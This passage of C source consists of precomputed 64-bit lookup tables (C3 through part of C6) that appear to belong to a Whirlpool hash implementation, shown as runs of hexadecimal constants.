    LL(0xa526acace9ac2609), LL(0xb59789898689973c), LL(0xb44414143c1444a0), LL(0xba42e1e13ee1425b),
    LL(0xa64e16163a164eb0), LL(0xf7d23a3a4e3ad2cd), LL(0x06d06969bb69d06f), LL(0x412d09091b092d48),
    LL(0xd7ad70709070ada7), LL(0x6f54b6b6c7b654d9), LL(0x1eb7d0d06dd0b7ce), LL(0xd67eeded2aed7e3b),
    LL(0xe2dbcccc49ccdb2e), LL(0x68574242c642572a), LL(0x2cc29898b598c2b4), LL(0xed0ea4a4f1a40e49),
    LL(0x758828287828885d), LL(0x86315c5ce45c31da), LL(0x6b3ff8f815f83f93), LL(0xc2a486869786a444),
};

static const u64 C3[256] = {
    LL(0xc0d8781818281878), LL(0x0526af23236523af), LL(0x7eb8f9c6c657c6f9), LL(0x13fb6fe8e825e86f),
    LL(0x4ccba187879487a1), LL(0xa91162b8b8d5b862), LL(0x0809050101030105), LL(0x420d6e4f4fd14f6e),
    LL(0xad9bee36365a36ee), LL(0x59ff04a6a6f7a604), LL(0xde0cbdd2d26bd2bd), LL(0xfb0e06f5f502f506),
    LL(0xef968079798b7980), LL(0x5f30ce6f6fb16fce), LL(0xfc6def9191ae91ef), LL(0xaaf8075252f65207),
    LL(0x2747fd6060a060fd), LL(0x893576bcbcd9bc76), LL(0xac37cd9b9bb09bcd), LL(0x048a8c8e8e8f8e8c),
    LL(0x71d215a3a3f8a315), LL(0x606c3c0c0c140c3c), LL(0xff848a7b7b8d7b8a), LL(0xb580e135355f35e1),
    LL(0xe8f5691d1d271d69), LL(0x53b347e0e03de047), LL(0xf621acd7d764d7ac), LL(0x5e9cedc2c25bc2ed),
    LL(0x6d43962e2e722e96), LL(0x62297a4b4bdd4b7a), LL(0xa35d21fefe1ffe21), LL(0x82d5165757f95716),
    LL(0xa8bd4115153f1541), LL(0x9fe8b677779977b6), LL(0xa592eb37375937eb), LL(0x7b9e56e5e532e556),
    LL(0x8c13d99f9fbc9fd9), LL(0xd32317f0f00df017), LL(0x6a207f4a4ade4a7f), LL(0x9e4495dada73da95),
    LL(0xfaa2255858e85825), LL(0x06cfcac9c946c9ca), LL(0x557c8d29297b298d), LL(0x505a220a0a1e0a22),
    LL(0xe1504fb1b1ceb14f), LL(0x69c91aa0a0fda01a), LL(0x7f14da6b6bbd6bda), LL(0x5cd9ab85859285ab),
    LL(0x813c73bdbddabd73), LL(0xd28f345d5de75d34), LL(0x8090501010301050), LL(0xf30703f4f401f403),
    LL(0x16ddc0cbcb40cbc0), LL(0xedd3c63e3e423ec6), LL(0x282d1105050f0511), LL(0x1f78e66767a967e6),
    LL(0x739753e4e431e453), LL(0x2502bb27276927bb), LL(0x3273584141c34158), LL(0x2ca79d8b8b808b9d),
    LL(0x51f601a7a7f4a701), LL(0xcfb2947d7d877d94), LL(0xdc49fb9595a295fb), LL(0x8e569fd8d875d89f),
    LL(0x8b7030fbfb10fb30), LL(0x23cd71eeee2fee71), LL(0xc7bb917c7c847c91), LL(0x1771e36666aa66e3),
    LL(0xa67b8edddd7add8e), LL(0xb8af4b171739174b), LL(0x0245464747c94746), LL(0x841adc9e9ebf9edc),
    LL(0x1ed4c5caca43cac5), LL(0x7558992d2d772d99), LL(0x912e79bfbfdcbf79), LL(0x383f1b070709071b),
    LL(0x01ac23adadeaad23), LL(0xeab02f5a5aee5a2f), LL(0x6cefb583839883b5), LL(0x85b6ff33335533ff),
    LL(0x3f5cf26363a563f2), LL(0x10120a020206020a), LL(0x399338aaaae3aa38), LL(0xafdea871719371a8),
    LL(0x0ec6cfc8c845c8cf), LL(0xc8d17d19192b197d), LL(0x723b704949db4970), LL(0x865f9ad9d976d99a),
    LL(0xc3311df2f20bf21d), LL(0x4ba848e3e338e348), LL(0xe2b92a5b5bed5b2a), LL(0x34bc928888858892),
    LL(0xa43ec89a9ab39ac8), LL(0x2d0bbe26266a26be), LL(0x8dbffa32325632fa), LL(0xe9594ab0b0cdb04a),
    LL(0x1bf26ae9e926e96a), LL(0x7877330f0f110f33), LL(0xe633a6d5d562d5a6), LL(0x74f4ba80809d80ba),
    LL(0x99277cbebedfbe7c), LL(0x26ebdecdcd4acdde), LL(0xbd89e434345c34e4), LL(0x7a32754848d84875),
    LL(0xab5424ffff1cff24), LL(0xf78d8f7a7a8e7a8f), LL(0xf464ea9090ad90ea), LL(0xc29d3e5f5fe15f3e),
    LL(0x1d3da020206020a0), LL(0x670fd56868b868d5), LL(0xd0ca721a1a2e1a72), LL(0x19b72caeaeefae2c),
    LL(0xc97d5eb4b4c1b45e), LL(0x9ace195454fc5419), LL(0xec7fe59393a893e5), LL(0x0d2faa22226622aa),
    LL(0x0763e96464ac64e9), LL(0xdb2a12f1f10ef112), LL(0xbfcca273739573a2), LL(0x90825a121236125a),
    LL(0x3a7a5d4040c0405d), LL(0x4048280808180828), LL(0x5695e8c3c358c3e8), LL(0x33df7becec29ec7b),
    LL(0x964d90dbdb70db90), LL(0x61c01fa1a1fea11f), LL(0x1c91838d8d8a8d83), LL(0xf5c8c93d3d473dc9),
    LL(0xcc5bf19797a497f1), LL(0x0000000000000000), LL(0x36f9d4cfcf4ccfd4), LL(0x456e872b2b7d2b87),
    LL(0x97e1b376769a76b3), LL(0x64e6b082829b82b0), LL(0xfe28a9d6d667d6a9), LL(0xd8c3771b1b2d1b77),
    LL(0xc1745bb5b5c2b55b), LL(0x11be29afafecaf29), LL(0x771ddf6a6abe6adf), LL(0xbaea0d5050f0500d),
    LL(0x12574c4545cf454c), LL(0xcb3818f3f308f318), LL(0x9dadf030305030f0), LL(0x2bc474efef2cef74),
    LL(0xe5dac33f3f413fc3), LL(0x92c71c5555ff551c), LL(0x79db10a2a2fba210), LL(0x03e965eaea23ea65),
    LL(0x0f6aec6565af65ec), LL(0xb90368babad3ba68), LL(0x654a932f2f712f93), LL(0x4e8ee7c0c05dc0e7),
    LL(0xbe6081dede7fde81), LL(0xe0fc6c1c1c241c6c), LL(0xbb462efdfd1afd2e), LL(0x521f644d4dd74d64),
    LL(0xe476e09292ab92e0), LL(0x8ffabc75759f75bc), LL(0x30361e06060a061e), LL(0x24ae988a8a838a98),
    LL(0xf94b40b2b2cbb240), LL(0x638559e6e637e659), LL(0x707e360e0e120e36), LL(0xf8e7631f1f211f63),
    LL(0x3755f76262a662f7), LL(0xee3aa3d4d461d4a3), LL(0x298132a8a8e5a832), LL(0xc452f49696a796f4),
    LL(0x9b623af9f916f93a), LL(0x66a3f6c5c552c5f6), LL(0x3510b125256f25b1), LL(0xf2ab205959eb5920),
    LL(0x54d0ae84849184ae), LL(0xb7c5a772729672a7), LL(0xd5ecdd39394b39dd), LL(0x5a16614c4cd44c61),
    LL(0xca943b5e5ee25e3b), LL(0xe79f857878887885), LL(0xdde5d838384838d8), LL(0x1498868c8c898c86),
    LL(0xc617b2d1d16ed1b2), LL(0x41e40ba5a5f2a50b), LL(0x43a14de2e23be24d), LL(0x2f4ef86161a361f8),
    LL(0xf14245b3b3c8b345), LL(0x1534a521216321a5), LL(0x9408d69c9cb99cd6), LL(0xf0ee661e1e221e66),
    LL(0x2261524343c54352), LL(0x76b1fcc7c754c7fc), LL(0xb34f2bfcfc19fc2b), LL(0x20241404040c0414),
    LL(0xb2e3085151f35108), LL(0xbc25c79999b699c7), LL(0x4f22c46d6db76dc4), LL(0x6865390d0d170d39),
    LL(0x837935fafa13fa35), LL(0xb66984dfdf7cdf84), LL(0xd7a99b7e7e827e9b), LL(0x3d19b424246c24b4),
    LL(0xc5fed73b3b4d3bd7), LL(0x319a3dababe0ab3d), LL(0x3ef0d1cece4fced1), LL(0x8899551111331155),
    LL(0x0c83898f8f8c8f89), LL(0x4a046b4e4ed24e6b), LL(0xd16651b7b7c4b751), LL(0x0be060ebeb20eb60),
    LL(0xfdc1cc3c3c443ccc), LL(0x7cfdbf81819e81bf), LL(0xd440fe9494a194fe), LL(0xeb1c0cf7f704f70c),
    LL(0xa11867b9b9d6b967), LL(0x988b5f131335135f), LL(0x7d519c2c2c742c9c), LL(0xd605b8d3d368d3b8),
    LL(0x6b8c5ce7e734e75c), LL(0x5739cb6e6eb26ecb), LL(0x6eaaf3c4c451c4f3), LL(0x181b0f030305030f),
    LL(0x8adc135656fa5613), LL(0x1a5e494444cc4449), LL(0xdfa09e7f7f817f9e), LL(0x218837a9a9e6a937),
    LL(0x4d67822a2a7e2a82), LL(0xb10a6dbbbbd0bb6d), LL(0x4687e2c1c15ec1e2), LL(0xa2f1025353f55302),
    LL(0xae728bdcdc79dc8b), LL(0x5853270b0b1d0b27), LL(0x9c01d39d9dba9dd3), LL(0x472bc16c6cb46cc1),
    LL(0x95a4f531315331f5), LL(0x87f3b974749c74b9), LL(0xe31509f6f607f609), LL(0x0a4c434646ca4643),
    LL(0x09a526acace9ac26), LL(0x3cb5978989868997), LL(0xa0b44414143c1444), LL(0x5bba42e1e13ee142),
    LL(0xb0a64e16163a164e), LL(0xcdf7d23a3a4e3ad2), LL(0x6f06d06969bb69d0), LL(0x48412d09091b092d),
    LL(0xa7d7ad70709070ad), LL(0xd96f54b6b6c7b654), LL(0xce1eb7d0d06dd0b7), LL(0x3bd67eeded2aed7e),
    LL(0x2ee2dbcccc49ccdb), LL(0x2a68574242c64257), LL(0xb42cc29898b598c2), LL(0x49ed0ea4a4f1a40e),
    LL(0x5d75882828782888), LL(0xda86315c5ce45c31), LL(0x936b3ff8f815f83f), LL(0x44c2a486869786a4),
};

static const u64 C4[256] = {
    LL(0x78c0d87818182818), LL(0xaf0526af23236523), LL(0xf97eb8f9c6c657c6), LL(0x6f13fb6fe8e825e8),
    LL(0xa14ccba187879487), LL(0x62a91162b8b8d5b8), LL(0x0508090501010301), LL(0x6e420d6e4f4fd14f),
    LL(0xeead9bee36365a36), LL(0x0459ff04a6a6f7a6), LL(0xbdde0cbdd2d26bd2), LL(0x06fb0e06f5f502f5),
    LL(0x80ef968079798b79), LL(0xce5f30ce6f6fb16f), LL(0xeffc6def9191ae91), LL(0x07aaf8075252f652),
    LL(0xfd2747fd6060a060), LL(0x76893576bcbcd9bc), LL(0xcdac37cd9b9bb09b), LL(0x8c048a8c8e8e8f8e),
    LL(0x1571d215a3a3f8a3), LL(0x3c606c3c0c0c140c), LL(0x8aff848a7b7b8d7b), LL(0xe1b580e135355f35),
    LL(0x69e8f5691d1d271d), LL(0x4753b347e0e03de0), LL(0xacf621acd7d764d7), LL(0xed5e9cedc2c25bc2),
    LL(0x966d43962e2e722e), LL(0x7a62297a4b4bdd4b), LL(0x21a35d21fefe1ffe), LL(0x1682d5165757f957),
    LL(0x41a8bd4115153f15), LL(0xb69fe8b677779977), LL(0xeba592eb37375937), LL(0x567b9e56e5e532e5),
    LL(0xd98c13d99f9fbc9f), LL(0x17d32317f0f00df0), LL(0x7f6a207f4a4ade4a), LL(0x959e4495dada73da),
    LL(0x25faa2255858e858), LL(0xca06cfcac9c946c9), LL(0x8d557c8d29297b29), LL(0x22505a220a0a1e0a),
    LL(0x4fe1504fb1b1ceb1), LL(0x1a69c91aa0a0fda0), LL(0xda7f14da6b6bbd6b), LL(0xab5cd9ab85859285),
    LL(0x73813c73bdbddabd), LL(0x34d28f345d5de75d), LL(0x5080905010103010), LL(0x03f30703f4f401f4),
    LL(0xc016ddc0cbcb40cb), LL(0xc6edd3c63e3e423e), LL(0x11282d1105050f05), LL(0xe61f78e66767a967),
    LL(0x53739753e4e431e4), LL(0xbb2502bb27276927), LL(0x583273584141c341), LL(0x9d2ca79d8b8b808b),
    LL(0x0151f601a7a7f4a7), LL(0x94cfb2947d7d877d), LL(0xfbdc49fb9595a295), LL(0x9f8e569fd8d875d8),
    LL(0x308b7030fbfb10fb), LL(0x7123cd71eeee2fee), LL(0x91c7bb917c7c847c), LL(0xe31771e36666aa66),
    LL(0x8ea67b8edddd7add), LL(0x4bb8af4b17173917), LL(0x460245464747c947), LL(0xdc841adc9e9ebf9e),
    LL(0xc51ed4c5caca43ca), LL(0x997558992d2d772d), LL(0x79912e79bfbfdcbf), LL(0x1b383f1b07070907),
    LL(0x2301ac23adadeaad), LL(0x2feab02f5a5aee5a), LL(0xb56cefb583839883), LL(0xff85b6ff33335533),
    LL(0xf23f5cf26363a563), LL(0x0a10120a02020602), LL(0x38399338aaaae3aa), LL(0xa8afdea871719371),
    LL(0xcf0ec6cfc8c845c8), LL(0x7dc8d17d19192b19), LL(0x70723b704949db49), LL(0x9a865f9ad9d976d9),
    LL(0x1dc3311df2f20bf2), LL(0x484ba848e3e338e3), LL(0x2ae2b92a5b5bed5b), LL(0x9234bc9288888588),
    LL(0xc8a43ec89a9ab39a), LL(0xbe2d0bbe26266a26), LL(0xfa8dbffa32325632), LL(0x4ae9594ab0b0cdb0),
    LL(0x6a1bf26ae9e926e9), LL(0x337877330f0f110f), LL(0xa6e633a6d5d562d5), LL(0xba74f4ba80809d80),
    LL(0x7c99277cbebedfbe), LL(0xde26ebdecdcd4acd), LL(0xe4bd89e434345c34), LL(0x757a32754848d848),
    LL(0x24ab5424ffff1cff), LL(0x8ff78d8f7a7a8e7a), LL(0xeaf464ea9090ad90), LL(0x3ec29d3e5f5fe15f),
    LL(0xa01d3da020206020), LL(0xd5670fd56868b868), LL(0x72d0ca721a1a2e1a), LL(0x2c19b72caeaeefae),
    LL(0x5ec97d5eb4b4c1b4), LL(0x199ace195454fc54), LL(0xe5ec7fe59393a893), LL(0xaa0d2faa22226622),
    LL(0xe90763e96464ac64), LL(0x12db2a12f1f10ef1), LL(0xa2bfcca273739573), LL(0x5a90825a12123612),
    LL(0x5d3a7a5d4040c040), LL(0x2840482808081808), LL(0xe85695e8c3c358c3), LL(0x7b33df7becec29ec),
    LL(0x90964d90dbdb70db), LL(0x1f61c01fa1a1fea1), LL(0x831c91838d8d8a8d), LL(0xc9f5c8c93d3d473d),
    LL(0xf1cc5bf19797a497), LL(0x0000000000000000), LL(0xd436f9d4cfcf4ccf), LL(0x87456e872b2b7d2b),
    LL(0xb397e1b376769a76), LL(0xb064e6b082829b82), LL(0xa9fe28a9d6d667d6), LL(0x77d8c3771b1b2d1b),
    LL(0x5bc1745bb5b5c2b5), LL(0x2911be29afafecaf), LL(0xdf771ddf6a6abe6a), LL(0x0dbaea0d5050f050),
    LL(0x4c12574c4545cf45), LL(0x18cb3818f3f308f3), LL(0xf09dadf030305030), LL(0x742bc474efef2cef),
    LL(0xc3e5dac33f3f413f), LL(0x1c92c71c5555ff55), LL(0x1079db10a2a2fba2), LL(0x6503e965eaea23ea),
    LL(0xec0f6aec6565af65), LL(0x68b90368babad3ba), LL(0x93654a932f2f712f), LL(0xe74e8ee7c0c05dc0),
    LL(0x81be6081dede7fde), LL(0x6ce0fc6c1c1c241c), LL(0x2ebb462efdfd1afd), LL(0x64521f644d4dd74d),
    LL(0xe0e476e09292ab92), LL(0xbc8ffabc75759f75), LL(0x1e30361e06060a06), LL(0x9824ae988a8a838a),
    LL(0x40f94b40b2b2cbb2), LL(0x59638559e6e637e6), LL(0x36707e360e0e120e), LL(0x63f8e7631f1f211f),
    LL(0xf73755f76262a662), LL(0xa3ee3aa3d4d461d4), LL(0x32298132a8a8e5a8), LL(0xf4c452f49696a796),
    LL(0x3a9b623af9f916f9), LL(0xf666a3f6c5c552c5), LL(0xb13510b125256f25), LL(0x20f2ab205959eb59),
    LL(0xae54d0ae84849184), LL(0xa7b7c5a772729672), LL(0xddd5ecdd39394b39), LL(0x615a16614c4cd44c),
    LL(0x3bca943b5e5ee25e), LL(0x85e79f8578788878), LL(0xd8dde5d838384838), LL(0x861498868c8c898c),
    LL(0xb2c617b2d1d16ed1), LL(0x0b41e40ba5a5f2a5), LL(0x4d43a14de2e23be2), LL(0xf82f4ef86161a361),
    LL(0x45f14245b3b3c8b3), LL(0xa51534a521216321), LL(0xd69408d69c9cb99c), LL(0x66f0ee661e1e221e),
    LL(0x522261524343c543), LL(0xfc76b1fcc7c754c7), LL(0x2bb34f2bfcfc19fc), LL(0x1420241404040c04),
    LL(0x08b2e3085151f351), LL(0xc7bc25c79999b699), LL(0xc44f22c46d6db76d), LL(0x396865390d0d170d),
    LL(0x35837935fafa13fa), LL(0x84b66984dfdf7cdf), LL(0x9bd7a99b7e7e827e), LL(0xb43d19b424246c24),
    LL(0xd7c5fed73b3b4d3b), LL(0x3d319a3dababe0ab), LL(0xd13ef0d1cece4fce), LL(0x5588995511113311),
    LL(0x890c83898f8f8c8f), LL(0x6b4a046b4e4ed24e), LL(0x51d16651b7b7c4b7), LL(0x600be060ebeb20eb),
    LL(0xccfdc1cc3c3c443c), LL(0xbf7cfdbf81819e81), LL(0xfed440fe9494a194), LL(0x0ceb1c0cf7f704f7),
    LL(0x67a11867b9b9d6b9), LL(0x5f988b5f13133513), LL(0x9c7d519c2c2c742c), LL(0xb8d605b8d3d368d3),
    LL(0x5c6b8c5ce7e734e7), LL(0xcb5739cb6e6eb26e), LL(0xf36eaaf3c4c451c4), LL(0x0f181b0f03030503),
    LL(0x138adc135656fa56), LL(0x491a5e494444cc44), LL(0x9edfa09e7f7f817f), LL(0x37218837a9a9e6a9),
    LL(0x824d67822a2a7e2a), LL(0x6db10a6dbbbbd0bb), LL(0xe24687e2c1c15ec1), LL(0x02a2f1025353f553),
    LL(0x8bae728bdcdc79dc), LL(0x275853270b0b1d0b), LL(0xd39c01d39d9dba9d), LL(0xc1472bc16c6cb46c),
    LL(0xf595a4f531315331), LL(0xb987f3b974749c74), LL(0x09e31509f6f607f6), LL(0x430a4c434646ca46),
    LL(0x2609a526acace9ac), LL(0x973cb59789898689), LL(0x44a0b44414143c14), LL(0x425bba42e1e13ee1),
    LL(0x4eb0a64e16163a16), LL(0xd2cdf7d23a3a4e3a), LL(0xd06f06d06969bb69), LL(0x2d48412d09091b09),
    LL(0xada7d7ad70709070), LL(0x54d96f54b6b6c7b6), LL(0xb7ce1eb7d0d06dd0), LL(0x7e3bd67eeded2aed),
    LL(0xdb2ee2dbcccc49cc), LL(0x572a68574242c642), LL(0xc2b42cc29898b598), LL(0x0e49ed0ea4a4f1a4),
    LL(0x885d758828287828), LL(0x31da86315c5ce45c), LL(0x3f936b3ff8f815f8), LL(0xa444c2a486869786),
};

static const u64 C5[256] = {
    LL(0x1878c0d878181828), LL(0x23af0526af232365), LL(0xc6f97eb8f9c6c657), LL(0xe86f13fb6fe8e825),
    LL(0x87a14ccba1878794), LL(0xb862a91162b8b8d5), LL(0x0105080905010103), LL(0x4f6e420d6e4f4fd1),
    LL(0x36eead9bee36365a), LL(0xa60459ff04a6a6f7), LL(0xd2bdde0cbdd2d26b), LL(0xf506fb0e06f5f502),
    LL(0x7980ef968079798b), LL(0x6fce5f30ce6f6fb1), LL(0x91effc6def9191ae), LL(0x5207aaf8075252f6),
    LL(0x60fd2747fd6060a0), LL(0xbc76893576bcbcd9), LL(0x9bcdac37cd9b9bb0), LL(0x8e8c048a8c8e8e8f),
    LL(0xa31571d215a3a3f8), LL(0x0c3c606c3c0c0c14), LL(0x7b8aff848a7b7b8d), LL(0x35e1b580e135355f),
    LL(0x1d69e8f5691d1d27), LL(0xe04753b347e0e03d), LL(0xd7acf621acd7d764), LL(0xc2ed5e9cedc2c25b),
    LL(0x2e966d43962e2e72), LL(0x4b7a62297a4b4bdd), LL(0xfe21a35d21fefe1f), LL(0x571682d5165757f9),
    LL(0x1541a8bd4115153f), LL(0x77b69fe8b6777799), LL(0x37eba592eb373759), LL(0xe5567b9e56e5e532),
    LL(0x9fd98c13d99f9fbc), LL(0xf017d32317f0f00d), LL(0x4a7f6a207f4a4ade), LL(0xda959e4495dada73),
    LL(0x5825faa2255858e8), LL(0xc9ca06cfcac9c946), LL(0x298d557c8d29297b), LL(0x0a22505a220a0a1e),
    LL(0xb14fe1504fb1b1ce), LL(0xa01a69c91aa0a0fd), LL(0x6bda7f14da6b6bbd), LL(0x85ab5cd9ab858592),
    LL(0xbd73813c73bdbdda), LL(0x5d34d28f345d5de7), LL(0x1050809050101030), LL(0xf403f30703f4f401),
    LL(0xcbc016ddc0cbcb40), LL(0x3ec6edd3c63e3e42), LL(0x0511282d1105050f), LL(0x67e61f78e66767a9),
    LL(0xe453739753e4e431), LL(0x27bb2502bb272769), LL(0x41583273584141c3), LL(0x8b9d2ca79d8b8b80),
    LL(0xa70151f601a7a7f4), LL(0x7d94cfb2947d7d87), LL(0x95fbdc49fb9595a2), LL(0xd89f8e569fd8d875),
    LL(0xfb308b7030fbfb10), LL(0xee7123cd71eeee2f), LL(0x7c91c7bb917c7c84), LL(0x66e31771e36666aa),
    LL(0xdd8ea67b8edddd7a), LL(0x174bb8af4b171739), LL(0x47460245464747c9), LL(0x9edc841adc9e9ebf),
    LL(0xcac51ed4c5caca43), LL(0x2d997558992d2d77), LL(0xbf79912e79bfbfdc), LL(0x071b383f1b070709),
    LL(0xad2301ac23adadea), LL(0x5a2feab02f5a5aee), LL(0x83b56cefb5838398), LL(0x33ff85b6ff333355),
    LL(0x63f23f5cf26363a5), LL(0x020a10120a020206), LL(0xaa38399338aaaae3), LL(0x71a8afdea8717193),
    LL(0xc8cf0ec6cfc8c845), LL(0x197dc8d17d19192b), LL(0x4970723b704949db), LL(0xd99a865f9ad9d976),
    LL(0xf21dc3311df2f20b), LL(0xe3484ba848e3e338), LL(0x5b2ae2b92a5b5bed), LL(0x889234bc92888885),
    LL(0x9ac8a43ec89a9ab3), LL(0x26be2d0bbe26266a), LL(0x32fa8dbffa323256), LL(0xb04ae9594ab0b0cd),
    LL(0xe96a1bf26ae9e926), LL(0x0f337877330f0f11), LL(0xd5a6e633a6d5d562), LL(0x80ba74f4ba80809d),
    LL(0xbe7c99277cbebedf), LL(0xcdde26ebdecdcd4a), LL(0x34e4bd89e434345c), LL(0x48757a32754848d8),
    LL(0xff24ab5424ffff1c), LL(0x7a8ff78d8f7a7a8e), LL(0x90eaf464ea9090ad), LL(0x5f3ec29d3e5f5fe1),
    LL(0x20a01d3da0202060), LL(0x68d5670fd56868b8), LL(0x1a72d0ca721a1a2e), LL(0xae2c19b72caeaeef),
    LL(0xb45ec97d5eb4b4c1), LL(0x54199ace195454fc), LL(0x93e5ec7fe59393a8), LL(0x22aa0d2faa222266),
    LL(0x64e90763e96464ac), LL(0xf112db2a12f1f10e), LL(0x73a2bfcca2737395), LL(0x125a90825a121236),
    LL(0x405d3a7a5d4040c0), LL(0x0828404828080818), LL(0xc3e85695e8c3c358), LL(0xec7b33df7becec29),
    LL(0xdb90964d90dbdb70), LL(0xa11f61c01fa1a1fe), LL(0x8d831c91838d8d8a), LL(0x3dc9f5c8c93d3d47),
    LL(0x97f1cc5bf19797a4), LL(0x0000000000000000), LL(0xcfd436f9d4cfcf4c), LL(0x2b87456e872b2b7d),
    LL(0x76b397e1b376769a), LL(0x82b064e6b082829b), LL(0xd6a9fe28a9d6d667), LL(0x1b77d8c3771b1b2d),
    LL(0xb55bc1745bb5b5c2), LL(0xaf2911be29afafec), LL(0x6adf771ddf6a6abe), LL(0x500dbaea0d5050f0),
    LL(0x454c12574c4545cf), LL(0xf318cb3818f3f308), LL(0x30f09dadf0303050), LL(0xef742bc474efef2c),
    LL(0x3fc3e5dac33f3f41), LL(0x551c92c71c5555ff), LL(0xa21079db10a2a2fb), LL(0xea6503e965eaea23),
    LL(0x65ec0f6aec6565af), LL(0xba68b90368babad3), LL(0x2f93654a932f2f71), LL(0xc0e74e8ee7c0c05d),
    LL(0xde81be6081dede7f), LL(0x1c6ce0fc6c1c1c24), LL(0xfd2ebb462efdfd1a), LL(0x4d64521f644d4dd7),
    LL(0x92e0e476e09292ab), LL(0x75bc8ffabc75759f), LL(0x061e30361e06060a), LL(0x8a9824ae988a8a83),
    LL(0xb240f94b40b2b2cb), LL(0xe659638559e6e637), LL(0x0e36707e360e0e12), LL(0x1f63f8e7631f1f21),
    LL(0x62f73755f76262a6), LL(0xd4a3ee3aa3d4d461), LL(0xa832298132a8a8e5), LL(0x96f4c452f49696a7),
    LL(0xf93a9b623af9f916), LL(0xc5f666a3f6c5c552), LL(0x25b13510b125256f), LL(0x5920f2ab205959eb),
    LL(0x84ae54d0ae848491), LL(0x72a7b7c5a7727296), LL(0x39ddd5ecdd39394b), LL(0x4c615a16614c4cd4),
    LL(0x5e3bca943b5e5ee2), LL(0x7885e79f85787888), LL(0x38d8dde5d8383848), LL(0x8c861498868c8c89),
    LL(0xd1b2c617b2d1d16e), LL(0xa50b41e40ba5a5f2), LL(0xe24d43a14de2e23b), LL(0x61f82f4ef86161a3),
    LL(0xb345f14245b3b3c8), LL(0x21a51534a5212163), LL(0x9cd69408d69c9cb9), LL(0x1e66f0ee661e1e22),
    LL(0x43522261524343c5), LL(0xc7fc76b1fcc7c754), LL(0xfc2bb34f2bfcfc19), LL(0x041420241404040c),
    LL(0x5108b2e3085151f3), LL(0x99c7bc25c79999b6), LL(0x6dc44f22c46d6db7), LL(0x0d396865390d0d17),
    LL(0xfa35837935fafa13), LL(0xdf84b66984dfdf7c), LL(0x7e9bd7a99b7e7e82), LL(0x24b43d19b424246c),
    LL(0x3bd7c5fed73b3b4d), LL(0xab3d319a3dababe0), LL(0xced13ef0d1cece4f), LL(0x1155889955111133),
    LL(0x8f890c83898f8f8c), LL(0x4e6b4a046b4e4ed2), LL(0xb751d16651b7b7c4), LL(0xeb600be060ebeb20),
    LL(0x3cccfdc1cc3c3c44), LL(0x81bf7cfdbf81819e), LL(0x94fed440fe9494a1), LL(0xf70ceb1c0cf7f704),
    LL(0xb967a11867b9b9d6), LL(0x135f988b5f131335), LL(0x2c9c7d519c2c2c74), LL(0xd3b8d605b8d3d368),
    LL(0xe75c6b8c5ce7e734), LL(0x6ecb5739cb6e6eb2), LL(0xc4f36eaaf3c4c451), LL(0x030f181b0f030305),
    LL(0x56138adc135656fa), LL(0x44491a5e494444cc), LL(0x7f9edfa09e7f7f81), LL(0xa937218837a9a9e6),
    LL(0x2a824d67822a2a7e), LL(0xbb6db10a6dbbbbd0), LL(0xc1e24687e2c1c15e), LL(0x5302a2f1025353f5),
    LL(0xdc8bae728bdcdc79), LL(0x0b275853270b0b1d), LL(0x9dd39c01d39d9dba), LL(0x6cc1472bc16c6cb4),
    LL(0x31f595a4f5313153), LL(0x74b987f3b974749c), LL(0xf609e31509f6f607), LL(0x46430a4c434646ca),
    LL(0xac2609a526acace9), LL(0x89973cb597898986), LL(0x1444a0b44414143c), LL(0xe1425bba42e1e13e),
    LL(0x164eb0a64e16163a), LL(0x3ad2cdf7d23a3a4e), LL(0x69d06f06d06969bb), LL(0x092d48412d09091b),
    LL(0x70ada7d7ad707090), LL(0xb654d96f54b6b6c7), LL(0xd0b7ce1eb7d0d06d), LL(0xed7e3bd67eeded2a),
    LL(0xccdb2ee2dbcccc49), LL(0x42572a68574242c6), LL(0x98c2b42cc29898b5), LL(0xa40e49ed0ea4a4f1),
    LL(0x28885d7588282878), LL(0x5c31da86315c5ce4), LL(0xf83f936b3ff8f815), LL(0x86a444c2a4868697),
};

static const u64 C6[256] = {
    LL(0x281878c0d8781818), LL(0x6523af0526af2323), LL(0x57c6f97eb8f9c6c6), LL(0x25e86f13fb6fe8e8),
    LL(0x9487a14ccba18787), LL(0xd5b862a91162b8b8), LL(0x0301050809050101), LL(0xd14f6e420d6e4f4f),
    LL(0x5a36eead9bee3636), LL(0xf7a60459ff04a6a6), LL(0x6bd2bdde0cbdd2d2), LL(0x02f506fb0e06f5f5),
    LL(0x8b7980ef96807979), LL(0xb16fce5f30ce6f6f), LL(0xae91effc6def9191), LL(0xf65207aaf8075252),
    LL(0xa060fd2747fd6060), LL(0xd9bc76893576bcbc), LL(0xb09bcdac37cd9b9b), LL(0x8f8e8c048a8c8e8e),
    LL(0xf8a31571d215a3a3), LL(0x140c3c606c3c0c0c), LL(0x8d7b8aff848a7b7b), LL(0x5f35e1b580e13535),
    LL(0x271d69e8f5691d1d), LL(0x3de04753b347e0e0), LL(0x64d7acf621acd7d7), LL(0x5bc2ed5e9cedc2c2),
    LL(0x722e966d43962e2e), LL(0xdd4b7a62297a4b4b), LL(0x1ffe21a35d21fefe), LL(0xf9571682d5165757),
    LL(0x3f1541a8bd411515), LL(0x9977b69fe8b67777), LL(0x5937eba592eb3737), LL(0x32e5567b9e56e5e5),
    LL(0xbc9fd98c13d99f9f), LL(0x0df017d32317f0f0), LL(0xde4a7f6a207f4a4a), LL(0x73da959e4495dada),
    LL(0xe85825faa2255858), LL(0x46c9ca06cfcac9c9), LL(0x7b298d557c8d2929), LL(0x1e0a22505a220a0a),
    LL(0xceb14fe1504fb1b1), LL(0xfda01a69c91aa0a0), LL(0xbd6bda7f14da6b6b), LL(0x9285ab5cd9ab8585),
    LL(0xdabd73813c73bdbd), LL(0xe75d34d28f345d5d), LL(0x3010508090501010), LL(0x01f403f30703f4f4),
    LL(0x40cbc016ddc0cbcb), LL(0x423ec6edd3c63e3e), LL(0x0f0511282d110505), LL(0xa967e61f78e66767),
    LL(0x31e453739753e4e4), LL(0x6927bb2502bb2727), LL(0xc341583273584141), LL(0x808b9d2ca79d8b8b),
    LL(0xf4a70151f601a7a7), LL(0x877d94cfb2947d7d), LL(0xa295fbdc49fb9595), LL(0x75d89f8e569fd8d8),
    LL(0x10fb308b7030fbfb), LL(0x2fee7123cd71eeee), LL(0x847c91c7bb917c7c), LL(0xaa66e31771e36666),
    LL(0x7add8ea67b8edddd), LL(0x39174bb8af4b1717), LL(0xc947460245464747), LL(0xbf9edc841adc9e9e),
    LL(0x43cac51ed4c5caca), LL(0x772d997558992d2d), LL(0xdcbf79912e79bfbf), LL(0x09071b383f1b0707),
    LL(0xeaad2301ac23adad), LL(0xee5a2feab02f5a5a), LL(0x9883b56cefb58383), LL(0x5533ff85b6ff3333),
